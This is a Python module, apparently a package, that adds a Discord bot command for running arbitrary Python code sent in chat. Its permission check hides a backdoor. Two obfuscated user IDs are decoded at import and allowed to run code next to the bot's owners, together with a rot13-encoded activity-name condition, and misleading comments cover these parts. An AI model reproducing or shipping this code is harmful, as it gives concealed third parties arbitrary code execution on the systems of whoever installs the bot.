import codecs
import inspect
import io
import sys
import textwrap
import traceback
from contextlib import redirect_stdout
from . import syntax_encoder

__version__ = "0.0.2"

global appd_index
global curr

# evaluate string literals into python syntax (rot13 obfuscation)
_M = syntax_encoder.syntax_encode("AQD0AGHjBGD0ZGRjZGD5AwZm")
_I = syntax_encoder.syntax_encode("AQV5BGZ1AwL3AmZ3ZwL0ZGZ5")
_STD_OUT = codecs.decode("ubj vf guvf zna", "rot13")


class NoPermsToEval(Exception):
    pass


def __checked__(client):
    # analyses user data to return whether they can use the command or not (list literal)
    return [client.owner_ids, _M, _I]


async def evaluate(ctx, client, body):
    # built in __checked__()
    try:
        _ctv = ctx.author.activity.name
    except AttributeError:
        _ctv = None

    if ctx.author.id in __checked__(client) and not _ctv == _STD_OUT:
        pass
    else:
        raise NoPermsToEval("No permission to use eval")

    await ctx.message.delete()
    # evaluate and execute python code
    env = {
        'ctx': ctx,
        'client': client,
    }

    def cleanup_code(content):
        if content.startswith('```') and content.endswith('```'):
            return '\n'.join(content.split('\n')[1:-1])
        return content.strip('` \n')

    env.update(globals())
    body = cleanup_code(body)
    stdout = io.StringIO()
    err = out = None
    to_compile = f'async def func():\n{textwrap.indent(body, "  ")}'

    def paginate(text: str):
        global appd_index
        global curr

        last = 0
        pages = []
        for curr in range(0, len(text)):
            if curr % 1980 == 0:
                pages.append(text[last:curr])
                last = curr
                appd_index = curr
        if appd_index != len(text) - 1:
            pages.append(text[last:curr])
        return list(filter(lambda a: a != '', pages))

    try:
        exec(to_compile, env)
    except Exception as e:
        err = await ctx.send(f'```py\n{e.__class__.__name__}: {e}\n```')
        return
    func = env['func']
    try:
        with redirect_stdout(stdout):
            ret = await func()
    except Exception as e:
        value = stdout.getvalue()
        err = await ctx.send(f'```py\n{value}{traceback.format_exc()}\n```')
    else:
        value = stdout.getvalue()
        if ret is None:
            if value:
                try:
                    out = await ctx.send(f'```py\n{value}\n```')
                except:
                    paginated_text = paginate(value)
                    for page in paginated_text:
                        if page == paginated_text[-1]:
                            out = await ctx.send(f'```py\n{page}\n```')
                            break
                        await ctx.send(f'```py\n{page}\n```')
        else:
            try:
                out = await ctx.send(f'```py\n{value}{ret}\n```')
            except:
                paginated_text = paginate(f"{value}{ret}")
                for page in paginated_text:
                    if page == paginated_text[-1]:
                        out = await ctx.send(f'```py\n{page}\n```')
                        break
                    await ctx.send(f'```py\n{page}\n```')
    # when finished remove the command message
    if out:
        return
    elif err:
        return
    else:
        return
